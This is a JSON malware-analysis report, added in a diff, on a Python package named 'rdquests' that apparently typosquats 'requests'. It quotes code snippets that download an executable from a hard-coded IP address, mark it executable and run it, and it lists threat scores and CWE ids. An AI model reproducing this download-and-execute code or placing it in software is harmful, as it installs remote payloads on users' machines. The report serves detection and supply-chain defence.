@@ -1,0 +1,46 @@
+{
+  "package_metadata": {
+    "name": "rdquests",
+    "version": "2.28.1",
+    "author_email": ""
+  },
+  "behavior_analysis": {
+    "file_operations": [
+      "Writes remote binary content to a local file with executable permissions"
+    ],
+    "network_endpoints": [
+      "http://35.235.126.33/all.txt",
+      "http://35.235.126.33/{executable}"
+    ],
+    "process_spawns": [
+      "chmod +x {executable}",
+      "{executable}"
+    ]
+  },
+  "malicious_code": {
+    "suspicious_modules": [
+      {
+        "filename": "rdquests/frequest.py",
+        "code_snippet": "with open(executable, 'wb') as f:\n    f.write(req.content)\n\nif 'linux' in operating_system or 'darwin' in operating_system:\n    os.system(f'chmod +x {executable}')\n\nif 'linux' in operating_system:\n    os.system(f'./{executable}')"
+      },
+      {
+        "filename": "rdquests/frequest.py",
+        "code_snippet": "req = requests.get('http://35.235.126.33/all.txt')"
+      },
+      {
+        "filename": "rdquests/frequest.py",
+        "code_snippet": "url = f'http://35.235.126.33/{executable}'"
+      }
+    ]
+  },
+  "threat_assessment": {
+    "malware_score": 0.9,
+    "risk_score": 0.85,
+    "confidence": 0.95,
+    "cwe_ids": [
+      "CWE-502",
+      "CWE-94",
+      "CWE-200"
+    ]
+  }
+}
